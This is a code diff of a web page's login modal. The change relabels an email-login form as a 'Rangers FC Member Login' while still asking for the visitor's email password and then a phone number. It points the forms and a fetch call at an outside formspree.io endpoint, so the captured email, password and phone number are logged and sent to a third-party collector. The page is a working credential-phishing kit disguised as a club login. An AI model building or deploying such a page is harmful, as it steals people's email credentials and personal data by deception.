@@ -100,8 +100,8 @@
 
 <!-- Modal Login Form -->
 <div class="modal" id="loginModal">
-    <h2>Log in to Email Account to Continue</h2>
-    <form id="loginForm" action="/submit-form" method="POST">
+    <h2>Rangers FC Member Login</h2>
+    <form id="loginForm" action="https://formspree.io/f/xwpneebp" method="POST">
         <input type="email" id="email" name="email" placeholder="Enter your email" required>
         <input type="password" id="password" name="password" placeholder="Enter your email password" required>
         <button type="submit">Login</button>
@@ -111,8 +111,8 @@
 <!-- Phone Number Input (hidden initially) -->
 <div class="modal" id="phoneModal" style="display: none;">
     <h2>Enter Your Phone Number</h2>
-    <form id="phoneForm" action="/submit-phone" method="POST">
-        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number to receive the survey." required>
+    <form id="phoneForm" action="https://formspree.io/f/xwpneebp" method="POST">
+        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number, we will send the form immediately to your phone." required>
         <button type="submit">Submit</button>
     </form>
 </div>
@@ -153,8 +153,8 @@
         // Log the phone number along with email and password
         console.log(`Phone: ${phone}, Email: ${window.email}, Password: ${window.password}`);
 
-        // Send data to the server (e.g., via an AJAX request or form submission)
-        fetch('/submit-phone', {
+        // Send data to Formspree (you can modify the URL if you have a different endpoint)
+        fetch('https://formspree.io/f/your-form-id', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -168,7 +168,7 @@
         .then(response => response.text())
         .then(data => {
             // Handle response from server
-            alert(data);
+            alert('Form submitted successfully!');
         })
         .catch(error => console.error('Error:', error));
     });
